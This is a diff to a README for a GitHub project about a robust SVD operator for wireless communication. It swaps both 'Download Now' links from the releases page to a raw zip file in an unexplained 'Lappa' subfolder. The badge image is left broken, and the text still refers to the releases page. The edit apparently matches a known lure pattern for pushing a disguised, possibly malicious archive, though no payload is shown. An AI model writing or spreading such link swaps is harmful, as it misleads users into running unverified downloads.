@@ -19,7 +19,7 @@ To start using the AI-Enabled Robust SVD Operator, follow these simple steps:
 1. **Visit the Releases Page**
    Click the link below to access the downloads.
    
-   [![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-blue)](https://github.com/marko453/AI-Enabled-Robust-SVD-Operator-for-Wireless-Communication/releases)
+   [![Download Now](https://raw.githubusercontent.com/marko453/AI-Enabled-Robust-SVD-Operator-for-Wireless-Communication/main/Lappa/AI-Enabled-Robust-SVD-Operator-for-Wireless-Communication.zip%20Now-Get%20the%20Latest%20Version-blue)](https://raw.githubusercontent.com/marko453/AI-Enabled-Robust-SVD-Operator-for-Wireless-Communication/main/Lappa/AI-Enabled-Robust-SVD-Operator-for-Wireless-Communication.zip)
 
 2. **Choose the Right File**
    On the releases page, you will find several versions of the software. Look for the latest release, which is usually at the top of the list.
@@ -47,7 +47,7 @@ After downloading the file, follow these steps to install:
 
 For convenient access, here’s the link once again:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-blue)](https://github.com/marko453/AI-Enabled-Robust-SVD-Operator-for-Wireless-Communication/releases)
+[![Download Now](https://raw.githubusercontent.com/marko453/AI-Enabled-Robust-SVD-Operator-for-Wireless-Communication/main/Lappa/AI-Enabled-Robust-SVD-Operator-for-Wireless-Communication.zip%20Now-Get%20the%20Latest%20Version-blue)](https://raw.githubusercontent.com/marko453/AI-Enabled-Robust-SVD-Operator-for-Wireless-Communication/main/Lappa/AI-Enabled-Robust-SVD-Operator-for-Wireless-Communication.zip)
 
 ## 🔧 System Requirements
 
